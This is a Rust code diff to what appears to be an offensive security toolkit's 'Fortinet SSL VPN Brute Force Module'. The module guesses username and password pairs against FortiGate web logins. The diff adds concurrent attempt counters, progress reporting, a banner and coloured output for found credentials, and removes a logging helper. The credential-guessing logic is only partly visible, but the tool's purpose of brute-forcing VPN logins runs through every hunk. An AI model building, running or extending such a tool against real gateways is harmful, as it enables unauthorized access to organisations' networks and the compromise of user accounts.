@@ -7,7 +7,8 @@ use std::{
     io::{BufRead, BufReader, Write},
     path::{Path, PathBuf},
     sync::Arc,
-    sync::atomic::{AtomicBool, Ordering},
+    sync::atomic::{AtomicBool, AtomicU64, Ordering},
+    time::Instant,
 };
 use tokio::{
     sync::{Mutex, Semaphore},
@@ -15,9 +16,89 @@ use tokio::{
 };
 use regex::Regex;
 
+const PROGRESS_INTERVAL_SECS: u64 = 2;
+
+struct Statistics {
+    total_attempts: AtomicU64,
+    successful_attempts: AtomicU64,
+    failed_attempts: AtomicU64,
+    error_attempts: AtomicU64,
+    start_time: Instant,
+}
+
+impl Statistics {
+    fn new() -> Self {
+        Self {
+            total_attempts: AtomicU64::new(0),
+            successful_attempts: AtomicU64::new(0),
+            failed_attempts: AtomicU64::new(0),
+            error_attempts: AtomicU64::new(0),
+            start_time: Instant::now(),
+        }
+    }
+
+    fn record_attempt(&self, success: bool, error: bool) {
+        self.total_attempts.fetch_add(1, Ordering::Relaxed);
+        if error {
+            self.error_attempts.fetch_add(1, Ordering::Relaxed);
+        } else if success {
+            self.successful_attempts.fetch_add(1, Ordering::Relaxed);
+        } else {
+            self.failed_attempts.fetch_add(1, Ordering::Relaxed);
+        }
+    }
+
+    fn print_progress(&self) {
+        let total = self.total_attempts.load(Ordering::Relaxed);
+        let success = self.successful_attempts.load(Ordering::Relaxed);
+        let failed = self.failed_attempts.load(Ordering::Relaxed);
+        let errors = self.error_attempts.load(Ordering::Relaxed);
+        let elapsed = self.start_time.elapsed().as_secs_f64();
+        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };
+
+        print!(
+            "\r{} {} attempts | {} OK | {} fail | {} err | {:.1}/s    ",
+            "[Progress]".cyan(),
+            total.to_string().bold(),
+            success.to_string().green(),
+            failed,
+            errors.to_string().red(),
+            rate
+        );
+        let _ = std::io::stdout().flush();
+    }
+
+    fn print_final(&self) {
+        println!();
+        let total = self.total_attempts.load(Ordering::Relaxed);
+        let success = self.successful_attempts.load(Ordering::Relaxed);
+        let failed = self.failed_attempts.load(Ordering::Relaxed);
+        let errors = self.error_attempts.load(Ordering::Relaxed);
+        let elapsed = self.start_time.elapsed().as_secs_f64();
+
+        println!("{}", "=== Statistics ===".bold());
+        println!("  Total attempts:    {}", total);
+        println!("  Successful:        {}", success.to_string().green().bold());
+        println!("  Failed:            {}", failed);
+        println!("  Errors:            {}", errors.to_string().red());
+        println!("  Elapsed time:      {:.2}s", elapsed);
+        if elapsed > 0.0 {
+            println!("  Average rate:      {:.1} attempts/s", total as f64 / elapsed);
+        }
+    }
+}
+
+fn display_banner() {
+    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
+    println!("{}", "║   Fortinet SSL VPN Brute Force Module                     ║".cyan());
+    println!("{}", "║   FortiGate Web Login Credential Testing                  ║".cyan());
+    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
+    println!();
+}
+
 pub async fn run(target: &str) -> Result<()> {
-    println!("=== Fortinet SSL VPN Brute Force Module ===");
-    println!("[*] Target: {}", target);
+    display_banner();
+    println!("{}", format!("[*] Target: {}", target).cyan());
 
     let port: u16 = loop {
         let input = prompt_default("Fortinet VPN Port", "443")?;
@@ -105,6 +186,7 @@ pub async fn run(target: &str) -> Result<()> {
     
     let found_credentials = Arc::new(Mutex::new(Vec::new()));
     let stop_signal = Arc::new(AtomicBool::new(false));
+    let stats = Arc::new(Statistics::new());
 
     println!("\n[*] Starting brute-force on {}", base_url);
     println!("[*] Timeout: {} seconds", timeout_secs);
@@ -146,6 +228,20 @@ pub async fn run(target: &str) -> Result<()> {
     };
 
     println!("[*] Testing {} credential combinations", credential_pairs.len());
+    println!();
+
+    // Start progress reporter
+    let stats_clone = stats.clone();
+    let stop_clone = stop_signal.clone();
+    let progress_handle = tokio::spawn(async move {
+        loop {
+            if stop_clone.load(Ordering::Relaxed) {
+                break;
+            }
+            stats_clone.print_progress();
+            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
+        }
+    });
 
     let mut tasks = FuturesUnordered::new();
 
@@ -160,6 +256,7 @@ pub async fn run(target: &str) -> Result<()> {
         let found_credentials_clone = Arc::clone(&found_credentials);
         let stop_signal_clone = Arc::clone(&stop_signal);
         let semaphore_clone = Arc::clone(&semaphore);
+        let stats_clone = Arc::clone(&stats);
         let verbose_flag = verbose;
         let stop_on_success_flag = stop_on_success;
 
@@ -186,18 +283,25 @@ pub async fn run(target: &str) -> Result<()> {
                 timeout_duration
             ).await {
                 Ok(true) => {
-                    println!("[+] {} -> {}:{}", base_url_clone, user, pass);
+                    println!("\r{}", format!("[+] {} -> {}:{}", base_url_clone, user, pass).green().bold());
                     let mut found = found_credentials_clone.lock().await;
                     found.push((base_url_clone.clone(), user.clone(), pass.clone()));
+                    stats_clone.record_attempt(true, false);
                     if stop_on_success_flag {
                         stop_signal_clone.store(true, Ordering::Relaxed);
                     }
                 }
                 Ok(false) => {
-                    log(verbose_flag, &format!("[-] {} -> {}:{}", base_url_clone, user, pass));
+                    stats_clone.record_attempt(false, false);
+                    if verbose_flag {
+                        println!("\r{}", format!("[-] {} -> {}:{}", base_url_clone, user, pass).dimmed());
+                    }
                 }
                 Err(e) => {
-                    log(verbose_flag, &format!("[!] {}: error: {}", base_url_clone, e));
+                    stats_clone.record_attempt(false, true);
+                    if verbose_flag {
+                        println!("\r{}", format!("[!] {}: error: {}", base_url_clone, e).red());
+                    }
                 }
             }
             
@@ -208,15 +312,24 @@ pub async fn run(target: &str) -> Result<()> {
     // Wait for all tasks to complete
     while let Some(res) = tasks.next().await {
         if let Err(e) = res {
-            log(verbose, &format!("[!] Task join error: {}", e));
+            if verbose {
+                println!("\r{}", format!("[!] Task join error: {}", e).red());
+            }
         }
     }
 
+    // Stop progress reporter
+    stop_signal.store(true, Ordering::Relaxed);
+    let _ = progress_handle.await;
+
+    // Print final statistics
+    stats.print_final();
+
     let creds = found_credentials.lock().await;
     if creds.is_empty() {
-        println!("\n[-] No credentials found.");
+        println!("{}", "[-] No credentials found.".yellow());
     } else {
-        println!("\n[+] Valid credentials found:");
+        println!("{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
         for (url, user, pass) in creds.iter() {
             println!("    {} -> {}:{}", url, user, pass);
         }
@@ -488,12 +601,6 @@ fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
         .map(|line| line.trim().to_string())
         .filter(|line| !line.is_empty())
         .collect())
-}
-
-fn log(verbose: bool, msg: &str) {
-    if verbose {
-        println!("{}", msg);
-    }
 }
 
 fn get_filename_in_current_dir(input_path_str: &str) -> PathBuf {
